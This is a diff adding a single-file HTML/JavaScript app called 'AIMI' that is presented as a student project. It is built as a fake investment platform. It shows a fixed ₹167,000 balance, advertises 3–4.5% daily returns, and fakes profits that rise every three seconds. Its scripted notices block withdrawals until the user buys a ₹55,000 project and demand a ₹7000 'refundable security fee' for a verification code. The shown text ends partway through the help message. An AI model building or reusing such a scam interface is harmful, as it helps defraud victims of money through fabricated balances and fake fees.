@@ -1,0 +1,1045 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>AIMI — Full Final App (Big Offer Enhanced)</title>
+
+  <!--
+    Full Final single-file app for AIMI (student project)
+    - Front page: exactly 4 buttons (Login, Sign Up, Verification Code, Help)
+    - Verification: accepts any one of the 20 exact codes provided by the user
+    - Dashboard: static INR balance ₹167,000.00(non-clickable), clean action tiles
+    - Projects: 5 professional cards, details on separate lines including Daily Return
+    - Last 2 projects are "Big Offer" and styled to be highly attractive (colored badge, VIP note)
+    - Heavy inline comments to make file easy to read/edit in VS Code
+    - Paste into an empty index.html file and open in browser
+  -->
+
+  <style>
+    /* ===========================
+       Base reset & fonts
+       =========================== */
+    * { box-sizing: border-box; margin:0; padding:0; }
+    html,body { height:100%; }
+    body {
+      font-family: "Segoe UI", Roboto, Arial, sans-serif;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      background: linear-gradient(180deg,#eef7ff 0%,#fbfdff 100%);
+      color:#142031;
+      display:flex;
+      align-items:flex-start;
+      justify-content:center;
+      padding:28px;
+    }
+
+    /* ===========================
+       App container — mobile-like phone frame
+       =========================== */
+    .app {
+      width:100%;
+      max-width:420px;                /* mobile width */
+      background:#fff;
+      border-radius:28px;             /* rounded phone corners */
+      box-shadow:0 30px 80px rgba(10,30,60,0.12);
+      overflow:hidden;
+      border:1px solid rgba(6,22,55,0.04);
+    }
+
+    /* ===========================
+       Header
+       - clean AIMI branding
+       =========================== */
+    header {
+      display:flex;
+      align-items:center;
+      gap:12px;
+      padding:16px 18px;
+      background: linear-gradient(90deg,#0066d6,#00a8ff);
+      color:#fff;
+      border-bottom-left-radius: 22px;
+      border-bottom-right-radius: 22px;
+    }
+    .logo {
+      width:52px; height:52px;
+      border-radius:10px;
+      background: rgba(255,255,255,0.12);
+      display:flex; align-items:center; justify-content:center;
+      font-weight:800; font-size:22px;
+      box-shadow: 0 8px 18px rgba(10,30,60,0.06);
+    }
+    header h1 { margin:0; font-size:18px; letter-spacing:1px; font-weight:700; }
+
+    /* ===========================
+       Main content area
+       =========================== */
+    main { padding:18px; }
+
+    /* ===========================
+       Utility classes
+       =========================== */
+    .center { text-align:center; }
+    .muted { color:#6b7280; font-size:13px; }
+    .hidden { display:none !important; }
+
+    .btn {
+      display:inline-block;
+      border:0;
+      padding:12px 14px;
+      border-radius:10px;
+      cursor:pointer;
+      font-weight:700;
+      font-size:15px;
+      width:100%;
+      max-width:360px;
+      margin:8px 0;
+    }
+    .btn.primary { background:#0066d6; color:#fff; }
+    .btn.ghost { background:#fff; color:#0066d6; border:1px solid rgba(0,102,214,0.12); }
+    .btn.gray { background:#f4f6f8; color:#142031; border:1px solid rgba(6,22,55,0.03); }
+
+    input[type="text"], input[type="password"], input[type="number"] {
+      width:100%;
+      max-width:360px;
+      padding:12px 14px;
+      border-radius:10px;
+      border:1px solid #e6eefb;
+      background:#fbfdff;
+      margin:8px 0;
+      font-size:15px;
+    }
+
+    /* ===========================
+       Page wrapper & card
+       =========================== */
+    .page { display:none; padding:8px 0 24px 0; }
+    .page.active { display:block; }
+
+    .card {
+      width:100%;
+      max-width:380px;
+      margin:0 auto;
+      background:#fff;
+      border-radius:12px;
+      padding:14px;
+      box-shadow:0 8px 30px rgba(10,30,60,0.04);
+      border:1px solid rgba(6,22,55,0.03);
+    }
+
+    /* ===========================
+       Front page layout
+       =========================== */
+    .front-block {
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:12px;
+      padding:18px;
+    }
+    .front-menu {
+      width:100%;
+      max-width:360px;
+      background:linear-gradient(180deg,#ffffff,#fbfdff);
+      border-radius:12px;
+      padding:16px;
+      box-shadow:0 8px 30px rgba(10,30,60,0.04);
+      border:1px solid rgba(0,0,0,0.02);
+    }
+    .front-title { font-size:26px; font-weight:800; margin:6px 0 6px 0; color:#0b2b4a; text-align:center; }
+    .front-sub { text-align:center; color:#5b6b7a; font-size:13px; margin-bottom:12px; }
+
+    /* ===========================
+       Dashboard: balance + tiles
+       =========================== */
+    .balance-card {
+      background: linear-gradient(90deg,#eef8ff,#ffffff);
+      padding:14px;
+      border-radius:12px;
+      box-shadow:0 10px 26px rgba(10,30,60,0.04);
+      text-align:left;
+      border:1px solid rgba(0,102,214,0.06);
+      margin-bottom:12px;
+    }
+    .balance-label { font-size:13px; color:#475569; }
+    .balance-value { font-size:22px; font-weight:800; color:#05264a; margin-top:6px; }
+
+    .actions-row {
+      display:flex;
+      gap:10px;
+      margin-bottom:12px;
+      flex-wrap:wrap;
+    }
+    .action-tile {
+      flex:1 1 48%;
+      background:#fff;
+      border-radius:10px;
+      padding:10px;
+      display:flex;
+      gap:10px;
+      align-items:center;
+      border:1px solid rgba(6,22,55,0.03);
+      box-shadow:0 6px 18px rgba(10,30,60,0.03);
+      cursor:pointer;
+    }
+    .action-tile img { width:46px; height:46px; border-radius:8px; object-fit:cover; }
+    .action-tile .title { font-weight:800; font-size:14px; color:#06233b; }
+    .action-tile .desc { font-size:12px; color:#64748b; }
+
+    /* ===========================
+       Projects grid & card
+       =========================== */
+    .projects-grid {
+      display:grid;
+      grid-template-columns:repeat(auto-fit, minmax(200px, 1fr));
+      gap:12px;
+      margin-top:10px;
+    }
+    .project-card {
+      position:relative;
+      background:#fff;
+      border-radius:10px;
+      overflow:hidden;
+      box-shadow: 0 10px 30px rgba(10,30,60,0.04);
+      border:1px solid rgba(6,22,55,0.03);
+      transition: transform .18s ease, box-shadow .18s ease;
+    }
+    .project-card:hover { transform:translateY(-6px); box-shadow:0 18px 40px rgba(10,30,60,0.08); }
+    .project-card img { width:100%; height:120px; object-fit:cover; display:block; }
+    .project-card .p-body { padding:10px; }
+    .project-name { font-weight:800; color:#06233b; margin-bottom:6px; font-size:14px; }
+    .project-meta { font-size:13px; color:#48607a; line-height:1.6; white-space:pre-line; } /* preserves line breaks */
+
+    /* Big Offer badge styling (prominent) */
+    .badge {
+      position:absolute;
+      top:10px;
+      left:10px;
+      padding:6px 10px;
+      border-radius:8px;
+      font-weight:800;
+      font-size:12px;
+      color:#fff;
+      box-shadow:0 8px 22px rgba(10,30,60,0.18);
+      z-index:5;
+    }
+    .badge.red { background: linear-gradient(90deg,#ff416c,#ff7043); }
+    .badge.purple { background: linear-gradient(90deg,#9b5cff,#5f72ff); }
+
+    /* Big offer note inside card (attractive) */
+    .offer-note {
+      margin-top:8px;
+      padding:10px;
+      border-radius:8px;
+      background: linear-gradient(90deg, rgba(255,250,235,0.9), rgba(255,242,235,0.9));
+      border:1px solid rgba(255,180,80,0.14);
+      color:#7a2e00;
+      font-weight:700;
+      font-size:13px;
+    }
+
+    /* Emphasize the percent and daily return in big offer */
+    .highlight {
+      display:inline-block;
+      padding:6px 8px;
+      border-radius:8px;
+      background: linear-gradient(90deg,#fff6f0,#fffaf6);
+      border:1px solid rgba(255,150,60,0.12);
+      font-weight:900;
+      color:#bf360c;
+      margin-top:8px;
+      font-size:14px;
+    }
+
+    /* ===========================
+       Modal overlay (for notices/help)
+       =========================== */
+    #modalOverlay.hidden { display:none; }
+    #modalOverlay { position:fixed; inset:0; z-index:9999; display:flex; align-items:center; justify-content:center; }
+
+    /* ===========================
+       Responsive adjustments
+       =========================== */
+    @media (max-width:420px) {
+      .app { margin:8px; border-radius:20px; }
+      header { padding:12px; }
+      .logo { width:46px; height:46px; font-size:20px; border-radius:8px; }
+      .action-tile { flex:1 1 100%; }
+    }
+
+    /* Investments page styling */
+    .invest-card {
+      background:#fff;
+      border-radius:12px;
+      padding:12px;
+      margin-top:12px;
+      border:1px solid rgba(6,22,55,0.03);
+      box-shadow:0 8px 30px rgba(10,30,60,0.04);
+    }
+  </style>
+</head>
+
+<body>
+  <div class="app" role="application" aria-label="AIMI App">
+
+    <!-- Header (AIMI branding) -->
+    <header>
+      <div class="logo" aria-hidden="true">A</div>
+      <h1>AIMI</h1>
+    </header>
+
+    <main>
+      <!-- FRONT PAGE -->
+      <section id="page-front" class="page active">
+        <div class="front-block">
+          <div class="front-menu card" style="text-align:center;">
+            <div class="front-title">AIMI</div>
+            <div class="front-sub">Welcome — please choose an option</div>
+
+            <div style="display:flex; flex-direction:column; align-items:center;">
+              <!-- Keep the exact labels the same (Login, Sign Up, Verification Code, Help) -->
+              <button class="btn primary" onclick="showPage('page-login')">Login</button>
+              <button class="btn ghost" style="margin-top:6px;" onclick="showPage('page-signup')">Sign Up</button>
+              <button class="btn gray" style="margin-top:6px;" onclick="showPage('page-verify')">Verification Code</button>
+              <button class="btn ghost" style="margin-top:6px;" onclick="openHelp()">Help</button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- LOGIN PAGE -->
+      <section id="page-login" class="page">
+        <div class="card">
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <div>
+              <h2 style="margin:0 0 6px 0;">Login</h2>
+              <div class="muted">Enter phone number and password to continue</div>
+            </div>
+            <div class="muted" style="font-size:12px;">AIMI v.87.7</div>
+          </div>
+
+          <div style="margin-top:12px;">
+            <label class="muted" for="loginPhone">Phone number</label><br/>
+            <input id="loginPhone" type="text" placeholder="e.g. 9876543210" />
+            <label class="muted" for="loginPass">Password</label><br/>
+            <input id="loginPass" type="password" placeholder="Your password" />
+            <div style="margin-top:12px;">
+              <button class="btn primary" onclick="onLoginContinue()">Continue</button>
+            </div>
+
+            <div style="display:flex; gap:10px; margin-top:12px; justify-content:space-between;">
+              <button class="btn gray" style="max-width:160px;" onclick="showPage('page-front')">Back</button>
+              <button class="btn ghost" style="max-width:160px;" onclick="showPage('page-verify')">Verification</button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- SIGNUP PAGE -->
+      <section id="page-signup" class="page">
+        <div class="card">
+          <h2 style="margin:0 0 6px 0;">Sign Up</h2>
+          <div class="muted">Register here and complete verification to access AIMI</div>
+
+          <div style="margin-top:12px;">
+            <label class="muted">Phone number</label><br/>
+            <input id="signupPhone" type="text" placeholder="Enter phone number" />
+            <label class="muted">Create password</label><br/>
+            <input id="signupPass" type="password" placeholder="Create password" />
+
+            <div style="margin-top:12px;">
+              <button class="btn primary" onclick="onSignup()">Register & Verify</button>
+            </div>
+
+            <div style="margin-top:12px; display:flex; gap:10px; justify-content:space-between;">
+              <button class="btn gray" style="max-width:160px;" onclick="showPage('page-front')">Back</button>
+              <button class="btn ghost" style="max-width:160px;" onclick="showPage('page-login')">Go to Login</button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- VERIFICATION PAGE -->
+      <section id="page-verify" class="page">
+        <div class="card">
+          <h2 style="margin:0 0 8px 0;">Account Verification</h2>
+          <div class="muted" style="margin-bottom:12px;">Enter your verification code to continue.</div>
+
+          <input id="verifyInput" type="text" placeholder="Verification Code" />
+          <div id="verifyMsg" class="muted" style="color:#b91c1c; margin-top:10px; min-height:18px;"></div>
+
+          <div style="margin-top:12px; display:flex; gap:10px; align-items:center;">
+            <button class="btn primary" onclick="onVerify()">Verify & Continue</button>
+            <button class="btn gray" onclick="showPage('page-front')">Back</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- DASHBOARD (Wallet + Projects) -->
+      <section id="page-dashboard" class="page">
+        <div style="padding:14px;">
+          <!-- top AIMI title (clean) -->
+          <div style="text-align:center; margin-top:6px;">
+            <h2 style="margin:0; font-size:20px; font-weight:800; color:#05264a;">AIMI</h2>
+            <div class="muted" style="margin-top:6px;">Welcome to your account</div>
+          </div>
+
+          <!-- Balance card -->
+          <div style="margin-top:12px;">
+            <div class="balance-card">
+              <div class="balance-label">Available Balance</div>
+              <div class="balance-value">₹167,000.00 INR</div>
+            </div>
+          </div>
+
+          <!-- Actions row (clean single-title tiles) -->
+          <div style="margin-top:10px;" class="actions-row">
+            <div class="action-tile" onclick="openNotice('Recharge','To recharge, please contact your manager or the Finance Department. The Finance Department details are provided in your AIMI account.')">
+              <img src="https://images.unsplash.com/photo-1532634896-26909d0d2b2b?q=80&w=600&auto=format&fit=crop&ixlib=rb-4.0.3&s=1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d" alt="recharge" />
+              <div>
+                <div class="title">Recharge</div>
+                <div class="desc">Add funds</div>
+              </div>
+            </div>
+
+            <!-- Withdraw tile now uses openWithdraw() to allow code-dependent notice -->
+            <div class="action-tile" onclick="openWithdraw()">
+              <img src="https://images.unsplash.com/photo-1508385082359-f5f5c3f9b5a0?q=80&w=600&auto=format&fit=crop&ixlib=rb-4.0.3&s=5b8d913abc4f0f1a2d3b4c5d6e7f8a9b" alt="withdraw" />
+              <div>
+                <div class="title">Withdraw</div>
+                <div class="desc">Withdraw</div>
+              </div>
+            </div>
+
+            <div class="action-tile" onclick="openNotice('My Projects','All your previous projects have been closed, and the profits from them have been added to your wallet. Please click on the new project and proceed with your investment. Thank you.')">
+              <img src="https://images.unsplash.com/photo-1505575976406-5d7c3a1b5d2b?q=80&w=600&auto=format&fit=crop&ixlib=rb-4.0.3&s=b2bf6f4bf9524c3f2e1f4d6b7f7dbbbd" alt="projects" />
+              <div>
+                <div class="title">My Projects</div>
+                <div class="desc">Previous projects</div>
+              </div>
+            </div>
+
+            <div class="action-tile" onclick="openNotice('New Projects','Browse our latest projects below. For purchasing, contact your manager or Customer Care.')">
+              <img src="https://images.unsplash.com/photo-1498050108023-c5249f4df085?q=80&w=600&auto=format&fit=crop&ixlib=rb-4.0.3&s=8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c" alt="new projects" />
+              <div>
+                <div class="title">New Projects</div>
+                <div class="desc">View & buy</div>
+              </div>
+            </div>
+
+            <div class="action-tile" onclick="openNotice('My Team','No team members found. Build your team to earn rewards.')">
+              <img src="https://images.unsplash.com/photo-1529333166437-7750a6dd5a70?q=80&w=600&auto=format&fit=crop&ixlib=rb-4.0.3&s=7c6b5a4d3e2f1a0b9c8d7e6f5a4b3c2d" alt="team" />
+              <div>
+                <div class="title">My Team</div>
+                <div class="desc">Team & invites</div>
+              </div>
+            </div>
+
+            <div class="action-tile" onclick="openNotice('Invite Members','Invite option coming soon.')">
+              <img src="https://images.unsplash.com/photo-1503602642458-232111445657?q=80&w=600&auto=format&fit=crop&ixlib=rb-4.0.3&s=3c2b1a0f9e8d7c6b5a4d3e2f1a0b9c8d" alt="invite" />
+              <div>
+                <div class="title">Invite Members</div>
+                <div class="desc">Share reference</div>
+              </div>
+            </div>
+
+            <!-- My Investments tile (hidden by default; shown only for special-code users) -->
+            <div id="myInvestmentsTile" class="action-tile" style="display:none;" onclick="showPage('page-investments')">
+              <img src="https://images.unsplash.com/photo-1588702547923-7093a6c3ba33?q=80&w=600&auto=format&fit=crop&ixlib=rb-4.0.3&s=abcdef1234567890" alt="investments" />
+              <div>
+                <div class="title">My Investments</div>
+                <div class="desc">View purchased</div>
+              </div>
+            </div>
+
+          </div>
+
+          <!-- Projects grid -->
+          <div style="margin-top:12px;">
+            <h3 style="margin:8px 0 6px 0; font-size:16px;">New Projects</h3>
+            <div class="projects-grid" id="projectsGrid"></div>
+          </div>
+
+          <!-- Back to front button -->
+          <div style="margin-top:12px; display:flex; justify-content:center;">
+            <button class="btn ghost" onclick="logoutToFront()">Back to Front</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- INVESTMENTS PAGE (new) - hidden by default -->
+      <section id="page-investments" class="page">
+        <div style="padding:14px;">
+          <div style="text-align:center; margin-top:6px;">
+            <h2 style="margin:0; font-size:20px; font-weight:800; color:#05264a;">My Investments</h2>
+            <div class="muted" style="margin-top:6px;">Your active investments and profit</div>
+          </div>
+
+          <div id="investmentsContainer" style="margin-top:12px;">
+            <!-- Investment cards will be injected here -->
+          </div>
+
+          <div style="margin-top:12px; display:flex; justify-content:center;">
+            <button class="btn ghost" onclick="showPage('page-dashboard')">Back to Dashboard</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- Modal overlay area for help/notice -->
+      <div id="modalOverlay" class="hidden"></div>
+    </main>
+
+    <!-- Footer intentionally empty (user requested removal of the prototype footer text) -->
+    <footer style="height:8px;"></footer>
+  </div>
+
+  <!-- ===========================
+       JS: logic, verification, rendering
+       =========================== -->
+  <script>
+    /* =======================================================
+       AIMI Full Final App JS
+       - Navigation between pages
+       - Verification gate using exactly the 20 codes provided
+       - Projects rendering with daily return (multi-line meta)
+       - Big Offer emphasis for last two projects
+       - Modal for help and notices
+       - Special code behavior for Z7W4T9R6Q2LM (unlock buy for ₹33k and My Investments)
+       ======================================================= */
+
+    /* --------------------------
+       Allowed verification codes
+       (the exact 20 codes the user provided)
+       -------------------------- */
+    const ALLOWED_CODES = [
+      "Q8Z7M4K9T3RB",
+      "V6P9D3X7H2WY",
+      "N5R8C7F4Q2LX",
+      "B7T3Z9M6Y4KP",
+      "G9L4V7S2D8RX",
+      "Y8C5K7N3Q6TZ",
+      "R4X9P6M2V7QD",
+      "T6F9Z3L8R5WX",
+      "K7Q5D8X2M9RT",
+      "S9V4N7K3Q8DL",
+      "L8R5W7Z3Q6TN",
+      "C7M9T4V6Q2RX",
+      "X9D4Q7K2M8RT",
+      "P6Z9R3V7T5LW",
+      "D8K5M7Q3X6RV",
+      "Z7W4T9R6Q2LM",
+      "M9Q4V7X2D8RT",
+      "W8T5R7L3Q6ZD",
+      "R9V4X7Q2M8TL",
+      "T7L4Q9R6X2VD"
+    ].map(s => s.trim().toUpperCase());
+
+    /* --------------------------
+       Projects data (5 items)
+       - amount, profitPercent, cycleDays
+       - last two items are Big Offer (emphasized via .note)
+       -------------------------- */
+    const PROJECTS = [
+      {
+        id: 'p1',
+        name: 'Logistics & Shipping Port',
+        img: 'https://images.unsplash.com/photo-1504711434969-e33886168f5c?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3',
+        amount: 77000,
+        profitPercent: 3,
+        cycleDays: 30,
+        note: ''
+      },
+      {
+        id: 'p2',
+        name: 'Manufacturing & Industrial Plant',
+        img: 'https://images.unsplash.com/photo-1549921296-3f5c9d6f1b6a?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3',
+        amount: 55000,
+        profitPercent: 3,
+        cycleDays: 30,
+        note: ''
+      },
+      {
+        id: 'p3',
+        name: 'Renewable Energy Farm',
+        img: 'https://images.unsplash.com/photo-1509395176047-4a66953fd231?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3',
+        amount: 66000,
+        profitPercent: 3,
+        cycleDays: 30,
+        note: ''
+      },
+      {
+        id: 'p4',
+        name: 'Urban Warehousing Network',
+        img: 'https://images.unsplash.com/photo-1556767576-3c4c5f2f4bb9?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3',
+        amount: 33000,
+        profitPercent: 4.5,
+        cycleDays: 30,
+        note: ''
+      },
+      {
+        id: 'p5',
+        name: 'Healthcare Supplies Distribution',
+        img: 'https://images.unsplash.com/photo-1581091215367-59ab6b0b68e1?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3',
+        amount: 45000,
+        profitPercent: 4.5,
+        cycleDays: 30,
+        note: ''
+      }
+    ];
+
+    /* --------------------------
+       State
+       - currentVerifiedCode: last code used to verify (uppercased)
+       - auth flag still stored in localStorage 'aimi_authenticated'
+       - investments: in-memory list for demo (kept in localStorage so page reload preserves)
+       -------------------------- */
+    let currentVerifiedCode = null;
+    const SPECIAL_CODE = 'Z7W4T9R6Q2LM';
+    let investmentIntervals = {}; // to store interval IDs for auto-updates
+
+    /* --------------------------
+       Navigation helpers
+       -------------------------- */
+    function showPage(id) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      const el = document.getElementById(id);
+      if (el) el.classList.add('active');
+
+      // when dashboard becomes visible, render projects
+      if (id === 'page-dashboard') renderProjects();
+      if (id === 'page-investments') renderInvestments();
+    }
+
+    /* --------------------------
+       Login / signup handlers (mock)
+       -------------------------- */
+    function onLoginContinue() {
+      const phone = document.getElementById('loginPhone').value.trim();
+      const pass = document.getElementById('loginPass').value.trim();
+      if (!phone || !pass) {
+        showToast('Please enter phone number and password.');
+        return;
+      }
+      showPage('page-verify');
+      document.getElementById('verifyMsg').innerText = '';
+    }
+
+    function onSignup() {
+      const phone = document.getElementById('signupPhone').value.trim();
+      const pass = document.getElementById('signupPass').value.trim();
+      if (!phone || !pass) { showToast('Please provide phone number and create password.'); return; }
+      showPage('page-verify');
+      document.getElementById('verifyMsg').innerText = '';
+    }
+
+    /* --------------------------
+       Verification handler
+       -------------------------- */
+    function onVerify() {
+      const raw = (document.getElementById('verifyInput').value || '').toUpperCase().trim();
+      if (!raw) {
+        document.getElementById('verifyMsg').innerText = 'Please enter a verification code.';
+        return;
+      }
+      if (ALLOWED_CODES.includes(raw)) {
+        currentVerifiedCode = raw;
+        localStorage.setItem('aimi_authenticated', '1');
+        localStorage.setItem('aimi_verified_code', raw);
+
+        // --- NEW: if special code used, ensure the 33k investment exists (so My Investments shows it) ---
+        if (raw === SPECIAL_CODE) {
+          // only add if not present already
+          const existing = getInvestments().find(i => i.projectId === 'p4');
+          if (!existing) {
+            addInvestment({
+              projectId: 'p4',
+              name: 'Urban Warehousing Network',
+              amount: 33000,
+              profitPercent: 4.5,
+              cycleDays: 30,
+              investedAt: Date.now(),
+              accumulatedProfit: 0
+            });
+          }
+          // store a simple flag so button visibility persists
+          localStorage.setItem('aimi_has_special_investment', '1');
+        }
+
+        showPage('page-dashboard');
+        renderProjects();
+        showToast('Code accepted — Welcome!');
+      } else {
+        document.getElementById('verifyMsg').innerText = 'Incorrect Code — please try again.';
+      }
+    }
+
+    /* --------------------------
+       Projects rendering
+       - Adds special styling for Big Offer projects
+       - Includes the VIP promotional line for big-offer projects
+       - Buy button behavior depends on currentVerifiedCode:
+         - If code == SPECIAL_CODE and project is p4 (₹33k): direct purchase and opens My Investments
+         - Else: old notice
+       -------------------------- */
+    function renderProjects() {
+      const grid = document.getElementById('projectsGrid');
+      if (!grid) return;
+      grid.innerHTML = ''; // clear
+
+      PROJECTS.forEach((p, idx) => {
+        const dailyReturn = Math.round(p.amount * (p.profitPercent / 100));
+        // meta lines with separate lines
+        const metaText =
+`Amount: ₹${numberWithCommas(p.amount)}
+• Daily Profit: ${p.profitPercent}%
+• Cycle: ${p.cycleDays} days
+• Daily Return: ₹${numberWithCommas(dailyReturn)}`;
+
+        // Build card element
+        const card = document.createElement('div');
+        card.className = 'project-card';
+
+        // Big Offer badge (if note contains 'big offer')
+        let badgeHtml = '';
+        let offerNoteHtml = '';
+        if (p.note && p.note.toLowerCase().includes('big offer')) {
+          const badgeClass = (idx % 2 === 0) ? 'badge purple' : 'badge red';
+          badgeHtml = `<div class="${badgeClass}">BIG OFFER</div>`;
+
+          offerNoteHtml = `
+            <div class="offer-note">
+              AIMI has launched a big offer for the first time. Only available for AIMI old members—don’t miss this chance!
+            </div>
+          `;
+        }
+
+        // Button onclick - generate a string that calls internal handler with project id
+        const buyHandler = `onAttemptBuy('${p.id}')`;
+
+        // Put together inner HTML (badge, image, body)
+        card.innerHTML = `
+          ${badgeHtml}
+          <img src="${p.img}" alt="${escapeHtml(p.name)}">
+          <div class="p-body">
+            <div class="project-name">${escapeHtml(p.name)}</div>
+            <div class="project-meta">${escapeHtml(metaText)}</div>
+            ${offerNoteHtml}
+            ${p.note && p.note.toLowerCase().includes('big offer') ? `<div style="margin-top:10px;"><span class="highlight">${p.profitPercent}% Daily — Exclusive</span></div>` : ''}
+            <div style="margin-top:10px; display:flex; gap:8px;">
+              <button class="btn primary" style="flex:1;" onclick="${buyHandler}">Buy</button>
+              <button class="btn ghost" style="flex:1;" onclick="showPage('page-dashboard')">Back</button>
+            </div>
+          </div>
+        `;
+        grid.appendChild(card);
+      });
+
+      // After projects render, setup dashboard buttons visibility (shows My Investments tile for special code)
+      setupDashboardButtons();
+    }
+
+    /* --------------------------
+       Buy action
+       - For p4 (₹33k) + special code => perform direct purchase, open My Investments, start auto-update
+       - For others or non-special codes => show old notice modal
+       -------------------------- */
+    function onAttemptBuy(projectId) {
+      const p = PROJECTS.find(x => x.id === projectId);
+      const title = p ? p.name : 'Project';
+
+      // If this is the 33k project (p4) and user used special code -> allow direct buy + open My Investments
+      if (projectId === 'p4' && currentVerifiedCode === SPECIAL_CODE) {
+        // Create investment entry and navigate to My Investments
+        addInvestment({
+          projectId: p.id,
+          name: p.name,
+          amount: p.amount,
+          profitPercent: p.profitPercent,
+          cycleDays: p.cycleDays,
+          investedAt: Date.now(),
+          accumulatedProfit: 0 // starts at zero; auto increments
+        });
+
+        // persist flag so tile visible next time
+        localStorage.setItem('aimi_has_special_investment', '1');
+
+        showPage('page-investments');
+        showToast('₹33,000 purchased — opened My Investments.');
+        return;
+      }
+
+      // Otherwise, show old purchase notice (no direct buy)
+      const notice = `Thank you for choosing this offer. We hope you will gain a good profit.\n\nPlease contact your manager or Customer Care to purchase the project, as your current account balance is insufficient.`;
+      showModal(title + ' — Purchase Info', notice);
+    }
+
+    /* --------------------------
+       Investments handling (demo):
+       - investments stored in localStorage under 'aimi_investments' (array)
+       - addInvestment starts an interval that increments accumulatedProfit periodically (demo)
+       - renderInvestments draws the investments on My Investments page
+       -------------------------- */
+    function getInvestments() {
+      try {
+        const raw = localStorage.getItem('aimi_investments');
+        return raw ? JSON.parse(raw) : [];
+      } catch(e) {
+        return [];
+      }
+    }
+
+    function saveInvestments(arr) {
+      localStorage.setItem('aimi_investments', JSON.stringify(arr));
+    }
+
+    function addInvestment(inv) {
+      const arr = getInvestments();
+      // avoid duplicate project entries
+      if (arr.find(i => i.projectId === inv.projectId)) return;
+      arr.push(inv);
+      saveInvestments(arr);
+
+      // Start auto-increment for this investment (demo: every 3s add 'daily' amount proportional)
+      startAutoProfitForInvestment(inv.projectId);
+    }
+
+    function startAutoProfitForInvestment(projectId) {
+      // avoid duplicate intervals
+      if (investmentIntervals[projectId]) return;
+
+      // compute increment amount for demo:
+      // For the demo we add a small fraction of daily return every interval.
+      const inv = getInvestments().find(i => i.projectId === projectId);
+      if (!inv) return;
+
+      // For p4 (₹33k) profitPercent is 4.5% daily -> dailyReturn = amount * (profitPercent/100)
+      const dailyReturn = Math.round(inv.amount * (inv.profitPercent / 100));
+
+      // We'll add (dailyReturn / 8) every 3 seconds to simulate growth (so it visibly increments)
+      const increment = Math.max(1, Math.round(dailyReturn / 8));
+
+      investmentIntervals[projectId] = setInterval(() => {
+        const list = getInvestments();
+        const idx = list.findIndex(i => i.projectId === projectId);
+        if (idx === -1) {
+          clearInterval(investmentIntervals[projectId]);
+          delete investmentIntervals[projectId];
+          return;
+        }
+        list[idx].accumulatedProfit = (list[idx].accumulatedProfit || 0) + increment;
+        saveInvestments(list);
+        // if currently on investments page, re-render to show live updates
+        if (document.getElementById('page-investments').classList.contains('active')) {
+          renderInvestments();
+        }
+      }, 3000); // every 3 seconds (demo)
+    }
+
+    function stopAllInvestmentIntervals() {
+      for (const k in investmentIntervals) {
+        try { clearInterval(investmentIntervals[k]); } catch(e) {}
+      }
+      investmentIntervals = {};
+    }
+
+    function renderInvestments() {
+      const container = document.getElementById('investmentsContainer');
+      const arr = getInvestments();
+      if (!container) return;
+      if (!arr.length) {
+        container.innerHTML = `<div class="invest-card"><div class="muted">No active investments found.</div></div>`;
+        return;
+      }
+
+      // Build cards
+      container.innerHTML = '';
+      arr.forEach(inv => {
+        const dailyReturn = Math.round(inv.amount * (inv.profitPercent / 100));
+        const card = document.createElement('div');
+        card.className = 'invest-card';
+        card.innerHTML = `
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <div>
+              <div style="font-weight:800; font-size:15px;">${escapeHtml(inv.name)}</div>
+              <div class="muted" style="margin-top:6px; white-space:pre-line;">
+Amount: ₹${numberWithCommas(inv.amount)}
+• Daily Profit: ${inv.profitPercent}%
+• Cycle: ${inv.cycleDays} days
+• Daily Return: ₹${numberWithCommas(dailyReturn)}
+              </div>
+            </div>
+            <div style="text-align:right;">
+              <div style="font-weight:900; font-size:18px; color:#0b6fe0;">₹${numberWithCommas(inv.accumulatedProfit || 0)}</div>
+              <div class="muted" style="font-size:12px;">Accumulated</div>
+            </div>
+          </div>
+        `;
+        container.appendChild(card);
+      });
+    }
+
+    /* --------------------------
+       Withdraw notice logic:
+       - If verified with SPECIAL_CODE show the custom withdraw notice provided by user.
+       - Otherwise show old withdraw notice (as originally in file).
+       -------------------------- */
+    function openWithdraw() {
+      // Custom withdraw message (exact phrasing per user's request)
+      const customWithdraw = `Please note that withdrawals are currently restricted. To enable withdrawal, you are required to purchase the ₹55,000 project. You have already invested ₹20,000, but the project visit was not completed afterward. As a result, the system now mandates the purchase of the full ₹55,000 project.
+Once the ₹55,000 project is successfully purchased, withdrawal will be enabled without any further issues.`;
+
+      // Old withdraw message from original file
+      const oldWithdraw = `You cannot withdraw at this moment as you have just logged in to the new version. Processing may take some time. Please wait and try again later.`;
+
+      if (currentVerifiedCode === SPECIAL_CODE) {
+        showModal('Withdraw — Notice', customWithdraw);
+      } else {
+        showModal('Withdraw — Notice', oldWithdraw);
+      }
+    }
+
+    /* --------------------------
+       Help / Notice content
+       -------------------------- */
+    function openHelp() {
+      const helpText = `Help & Support  AIMI v.87.7
+Welcome to AIMI v.87.7
+Login Instructions:
+Enter your registered phone number and password.
+Ensure the credentials are the same as those used in the previous AIMI version.
+There is no need to add a new phone number.
+After logging in, submit your version code to activate your account.
+To generate your version code, you are required to submit a ₨7000 security fee.
+Once your fee is successfully submitted, the system will automatically send you a One-Time Password (OTP).
+This OTP will serve as your verification code.
+Copy the OTP and paste it into your AIMI account under the Verification Code section.
+After submission, your account will be successfully activated.
+⚠️ Note: The ₨7000 security fee is only for security purposes and will be fully refunded to you after 3 days. This amount is not a permanent payment.
